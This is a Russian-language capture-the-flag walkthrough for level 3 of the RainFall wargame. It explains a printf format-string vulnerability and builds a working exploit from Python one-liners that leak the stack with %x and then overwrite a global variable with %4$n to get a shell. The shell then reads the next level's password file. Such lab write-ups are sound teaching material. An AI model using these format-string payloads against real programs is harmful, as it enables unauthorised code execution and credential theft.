Как и на уровне 2, мы можем найти исполняемый файл, ожидающий ввода, распечатать его и выйти после нажатия клавиши enter

Проанализировав его с помощью gdb, мы увидим, что функция main() вызывает функцию с именем v().
Давайте сосредоточимся на функции v().
Мы видим вызов функции fgets(), которая защищает от атаки переполнения буфера.

   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>

Но мы также можем видеть вызов функции printf(), которая уязвима для эксплойта строки формата

   0x080484d5 <+49>:    call   0x8048390 <printf@plt>

После этого программа сравнивает значение глобальной переменной m при "0x804988c" с 64.
Если сравнение вернет значение true, то функция выведет "Wait, what?!\n" и запустит оболочку с помощью вызова system().
Нам нужно манипулировать функцией printf(), чтобы изменить значение переменной по адресу 0x804988c.
Сначала нам нужно распечатать память, пока мы не достигнем адреса переменной, которую мы хотим изменить :

#level3@RainFall:~$ python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' > /tmp/exploit
#level3@RainFall:~$ cat /tmp/exploit | ./level3
#aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
#level3@RainFall:~$

Наш буфер aaaa находится на 4-й позиции (61616161). Формат модификатора %x позволяет нам печатать адрес в стеке, приведенном к шестнадцатеричному целому числу без знака (main printf)
Теперь мы можем заменить наш буфер aaaa адресом переменной m в литтл-энде.

#level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit
#level3@RainFall:~$ cat /tmp/exploit | ./level3
# 200 b7fd1ac0 b7ff37d0 804988c
#level3@RainFall:~$

Хорошо, единственное, что нужно сделать, это то, что мы не хотим печатать память, мы хотим изменить содержимое переменной m.
Не забывайте, что переменная m должна иметь 64 байта, поэтому нам просто нужно добавить 60 байт к ранее переданному адресу.
Модификатор %n запишет количество байтов, указанное ранее в выбранном адресе. Мы можем указать адрес с опцией %[число]$n.
Наконец, наша окончательная атака на строку формата будет выглядеть так :

    адрес m: 4 байта
    блокнот произвольных данных: 60 байт
    модификатор %n

#level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
#level3@RainFall:~$ cat /tmp/exploit - | ./level3
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#Wait what?!
#whoami
#level4
#cat /home/user/level4/.pass
#b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
#^C
#level3@RainFall:~$ su level4
